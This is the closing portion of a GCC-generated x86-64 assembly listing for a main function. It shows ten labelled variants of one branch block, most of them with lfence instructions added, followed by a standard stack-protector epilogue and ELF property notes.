## Variant 0
.Lmain_win0_var0:
	popq	%rax
	addq	$32, %rsp
	testl	%eax, %eax
	jns	.L42
	movl	$0, %eax
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 1
.Lmain_win0_var1:
	popq	%rax
	addq	$32, %rsp
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 2
.Lmain_win0_var2:
	popq	%rax
	addq	$32, %rsp
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 3
.Lmain_win0_var3:
	popq	%rax
	addq	$32, %rsp
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 4
.Lmain_win0_var4:
	popq	%rax
	addq	$32, %rsp
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 5
.Lmain_win0_var5:
	popq	%rax
	addq	$32, %rsp
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 6
.Lmain_win0_var6:
	popq	%rax
	addq	$32, %rsp
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 7
.Lmain_win0_var7:
	popq	%rax
	addq	$32, %rsp
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 8
.Lmain_win0_var8:
	popq	%rax
	addq	$32, %rsp
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
## Variant 9
.Lmain_win0_var9:
	popq	%rax
	addq	$32, %rsp
	testl	%eax, %eax
	jns	.L42
	lfence
	movl	$0, %eax
	lfence
	movq	-8(%rbp), %rdx
	jmp	.Lmain_win0_continue
.Lmain_win0_continue:
	subq	%fs:40, %rdx
	je	.L44
	call	__stack_chk_fail@PLT
.L44:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4381:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.ident	"GCC: (Ubuntu 11.4.0-2ubuntu1~20.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:

